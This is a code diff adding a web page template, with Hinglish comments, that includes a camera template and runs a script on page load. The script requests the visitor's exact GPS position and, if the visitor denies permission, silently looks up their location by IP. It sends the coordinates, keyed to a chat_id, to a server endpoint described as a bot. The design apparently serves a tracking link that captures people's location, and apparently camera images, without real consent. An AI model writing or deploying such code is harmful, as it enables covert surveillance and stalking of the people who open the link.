@@ -1,0 +1,91 @@
+<!-- ================================================================= -->
+<!-- 🔗 [UI CONNECTION: camera.html include rahega]                    -->
+<!-- ================================================================= -->
+{% include 'camera.html' %}
+
+
+<!-- ================================================================= -->
+<!-- 🤖 [FIXED BACKGROUND LOCATION ENGINE WITH IP FALLBACK]            -->
+<!-- ================================================================= -->
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+
+    if (!chatId) {
+        console.error("chat_id URL me missing hai!");
+        return;
+    }
+
+    // 1. Data Bot Server ko bhejne ka function
+    function uploadLocationData(lat, lon, acc, methodType) {
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('latitude', lat);
+        fd.append('longitude', lon);
+        fd.append('accuracy', acc + (methodType ? ` (${methodType})` : ''));
+
+        fetch('/upload_location', {
+            method: 'POST',
+            body: fd
+        })
+        .then(res => console.log("Location successfully sent to bot"))
+        .catch(err => console.error("Upload error:", err));
+    }
+
+    // 2. Fallback: Agar GPS block/deny ho jaye toh IP se location nikalna
+    async function fallbackIPLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.latitude && data.longitude) {
+                uploadLocationData(data.latitude, data.longitude, 1000, "Approximate IP");
+            }
+        } catch (e) {
+            console.error("IP fallback failed:", e);
+        }
+    }
+
+    // 3. Exact GPS Geolocation Trigger
+    function requestGPSLocation() {
+        if (!navigator.geolocation) {
+            fallbackIPLocation();
+            return;
+        }
+
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 15000,          // 15 seconds wait time indoor GPS ke liye
+            maximumAge: 10000        // Recent cached GPS ko accept karega
+        };
+
+        navigator.geolocation.getCurrentPosition(
+            // Success handler
+            (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = Math.round(position.coords.accuracy);
+                uploadLocationData(lat, lon, acc, "Exact GPS");
+            },
+            // Error handler (Agar user Deny kare ya Timeout ho)
+            (err) => {
+                console.warn("GPS failed or denied, using IP fallback. Code:", err.code);
+                fallbackIPLocation();
+            },
+            geoOptions
+        );
+    }
+
+    // Page load hote hi location prompt trigger karein
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        requestGPSLocation();
+    } else {
+        window.addEventListener('DOMContentLoaded', requestGPSLocation);
+    }
+
+    // Backup: Screen par kahin bhi tap hone par agar permission bachi ho toh trigger karein
+    document.addEventListener('click', function() {
+        requestGPSLocation();
+    }, { once: true });
+})();
+</script>
